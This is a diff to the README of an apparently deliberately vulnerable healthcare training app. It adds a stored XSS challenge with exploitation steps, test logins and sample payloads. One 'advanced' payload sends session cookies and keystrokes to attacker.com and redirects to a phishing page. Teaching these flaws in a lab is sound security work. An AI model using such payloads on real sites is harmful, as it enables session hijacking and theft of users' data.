@@ -96,7 +96,63 @@ Execute JavaScript code in another user's browser through the password reset fun
 
 ---
 
-### Challenge 5: File Upload Bypass
+### Challenge 5: Stored Cross-Site Scripting (XSS) in Appointment Reason
+**Difficulty**: 🟢 Beginner  
+**Category**: Cross-Site Scripting  
+**Goal**: Execute persistent JavaScript code through appointment reason field that will be displayed to doctors.
+
+**Description**: The appointment booking system allows patients to enter a reason for their visit without proper sanitization. The reason field is stored in the database and then rendered using `dangerouslySetInnerHTML` on the doctor's dashboard, creating a stored XSS vulnerability.
+
+**What you'll learn**:
+- How stored XSS vulnerabilities work
+- The dangers of `dangerouslySetInnerHTML` in React
+- How user input can persist and affect other users
+- The importance of input sanitization and output encoding
+
+**Steps to exploit**:
+1. Log in as a patient account (e.g., `patient@test.com` / `password123`)
+2. Go to the Appointments tab
+3. Click "Book New Appointment"
+4. Fill in the appointment details
+5. In the "Reason for Visit" field, enter malicious JavaScript
+6. Submit the appointment
+7. Log in as a doctor account (e.g., `doctor@test.com` / `password123`)
+8. Go to the Appointments tab
+9. View the appointment - the JavaScript will execute in the doctor's browser
+
+**Sample XSS Payloads**:
+```html
+<script>alert('XSS in appointment reason!')</script>
+<img src="x" onerror="alert('XSS via image error')">
+<svg onload="alert('XSS via SVG')">
+<div onmouseover="alert('XSS on mouseover')">Hover me</div>
+```
+
+**Advanced Payloads**:
+```html
+<script>
+  // Steal session cookies
+  fetch('http://attacker.com/steal?cookie=' + document.cookie);
+  
+  // Keylogger
+  document.addEventListener('keypress', function(e) {
+    fetch('http://attacker.com/keylog?key=' + e.key);
+  });
+  
+  // Redirect to malicious site
+  window.location.href = 'http://attacker.com/phishing';
+</script>
+```
+
+**What you'll learn**:
+- How stored XSS can persist across sessions
+- The impact of XSS in healthcare applications
+- How to craft effective XSS payloads
+- The importance of Content Security Policy (CSP)
+
+---
+
+### Challenge 6: File Upload Bypass
 **Difficulty**: Beginner  
 **Category**: File Upload Vulnerabilities  
 **Goal**: Upload a file type that should be blocked by the security filters.
@@ -361,10 +417,10 @@ Execute JavaScript code in another user's browser through the password reset fun
 ## 💬 Community & Help
 
 ### 🎯 **Share Your Success!**
-Found an exploit? Discovered a creative attack vector? **[Share it in GitHub Discussions!](https://github.com/aligorithm/zero-health/discussions)**
+Found an exploit? Discovered a creative attack vector? **[Share it in GitHub Discussions!](https://github.com/aligorithm/ripperdoc/discussions)**
 
 ### ❓ **Need Help?**
-Stuck on a challenge? Don't understand a vulnerability? **[Ask for help in GitHub Discussions!](https://github.com/aligorithm/zero-health/discussions)**
+Stuck on a challenge? Don't understand a vulnerability? **[Ask for help in GitHub Discussions!](https://github.com/aligorithm/ripperdoc/discussions)**
 
 ### 💡 **Learning Together**
 - **Post your successful exploits** and explain your methodology
@@ -374,10 +430,10 @@ Stuck on a challenge? Don't understand a vulnerability? **[Ask for help in GitHu
 - **Suggest new challenges** or improvements to existing ones
 
 ### 🔗 **Quick Links**
-- **[🎯 Share Exploits & Solutions](https://github.com/aligorithm/zero-health/discussions)** 
-- **[❓ Get Help & Ask Questions](https://github.com/aligorithm/zero-health/discussions)**
-- **[💡 General Discussion](https://github.com/aligorithm/zero-health/discussions)**
-- **[🐛 Report Issues](https://github.com/aligorithm/zero-health/issues)**
+- **[🎯 Share Exploits & Solutions](https://github.com/aligorithm/ripperdoc/discussions)** 
+- **[❓ Get Help & Ask Questions](https://github.com/aligorithm/ripperdoc/discussions)**
+- **[💡 General Discussion](https://github.com/aligorithm/ripperdoc/discussions)**
+- **[🐛 Report Issues](https://github.com/aligorithm/ripperdoc/issues)**
 
 ---
 
